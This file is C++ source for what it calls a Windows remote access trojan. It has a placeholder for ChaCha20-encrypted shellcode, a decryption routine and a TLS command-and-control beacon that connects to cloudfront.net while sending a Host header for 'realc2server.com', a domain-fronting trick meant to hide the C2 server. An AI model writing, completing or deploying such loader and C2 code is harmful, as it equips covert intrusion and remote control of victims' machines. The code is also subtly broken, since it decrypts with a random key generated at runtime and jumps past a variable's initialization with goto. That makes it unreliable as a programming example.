#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <wincrypt.h>
#include <wininet.h>
#include <string.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <iostream>
#include <random>
#include <chrono>
#include <vector>

// Define encrypted payload (placeholder)
std::vector<unsigned char> encryptedPayload; // Placeholder for ChaCha20 Encrypted Shellcode

// Generate ChaCha20 Key and Nonce dynamically
void generateDynamicKey(unsigned char* key, unsigned char* nonce) {
    std::cout << "[INFO] Generating dynamic key and nonce." << std::endl;
    HCRYPTPROV hProv;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        std::cerr << "[ERROR] Failed to acquire cryptographic context." << std::endl;
        memset(key, 0, 32);
        memset(nonce, 0, 12);
        return;
    }
    CryptGenRandom(hProv, 32, key);
    CryptGenRandom(hProv, 12, nonce);
    CryptReleaseContext(hProv, 0);
}

// Decrypt payload using ChaCha20
std::vector<unsigned char> decryptPayload(const std::vector<unsigned char>& payload, const unsigned char* key, const unsigned char* nonce) {
    std::cout << "[INFO] Decrypting payload." << std::endl;
    std::vector<unsigned char> decrypted(payload.size());
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        std::cerr << "[ERROR] Failed to initialize decryption context." << std::endl;
        return {};
    }
    if (!EVP_DecryptInit_ex(ctx, EVP_chacha20(), NULL, key, nonce)) {
        std::cerr << "[ERROR] Failed to initialize ChaCha20 decryption." << std::endl;
        goto cleanup;
    }
    int len;
    if (!EVP_DecryptUpdate(ctx, decrypted.data(), &len, payload.data(), payload.size())) {
        std::cerr << "[ERROR] Decryption failed during update." << std::endl;
        goto cleanup;
    }

cleanup:
    EVP_CIPHER_CTX_free(ctx);
    return decrypted;
}

// Secure fallback execution
void secureFallback() {
    std::cerr << "[INFO] Executing secure fallback." << std::endl;
    MessageBox(NULL, "Fallback executed", "Info", MB_OK | MB_ICONINFORMATION);
}

// Secure WebSocket Communication with Local Fallback
void secureC2Comm() {
    std::cout << "[INFO] Establishing secure C2 communication." << std::endl;
    SSL_library_init();
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return;
    
    BIO* bio = BIO_new_ssl_connect(ctx);
    if (!bio) {
        SSL_CTX_free(ctx);
        return;
    }
    
    BIO_set_conn_hostname(bio, "cloudfront.net:443");
    SSL* ssl;
    BIO_get_ssl(bio, &ssl);
    SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
    
    int retries = 3;
    while (retries-- > 0) {
        if (BIO_do_connect(bio) > 0) break;
        std::cerr << "[WARNING] C2 connection attempt failed. Retries left: " << retries << std::endl;
        Sleep(3000);
    }
    
    if (retries <= 0) {
        BIO_free_all(bio);
        SSL_CTX_free(ctx);
        std::cerr << "[ERROR] C2 connection failed after multiple attempts. Falling back to local execution." << std::endl;
        secureFallback();
        return;
    }
    
    const char* request = "GET /c2path HTTP/1.1\r\nHost: realc2server.com\r\nConnection: close\r\n\r\n";
    BIO_write(bio, request, strlen(request));
    char response[1024] = {0};
    int bytesRead = 0, totalBytesRead = 0;
    while ((bytesRead = BIO_read(bio, response + totalBytesRead, sizeof(response) - totalBytesRead - 1)) > 0) {
        totalBytesRead += bytesRead;
    }
    response[totalBytesRead] = '\0';
    std::cout << "Received Encrypted Command: " << response << std::endl;
    
    BIO_free_all(bio);
    SSL_CTX_free(ctx);
}

// Main function with enhanced stealth
int main() {
    std::cout << "[INFO] Starting RAT execution." << std::endl;
    unsigned char key[32], nonce[12];
    generateDynamicKey(key, nonce);
    std::vector<unsigned char> decryptedPayload = decryptPayload(encryptedPayload, key, nonce);
    if (!decryptedPayload.empty()) {
        secureC2Comm();
    } else {
        std::cerr << "[ERROR] Decryption failed, skipping C2 communication." << std::endl;
    }
    return 0;
}
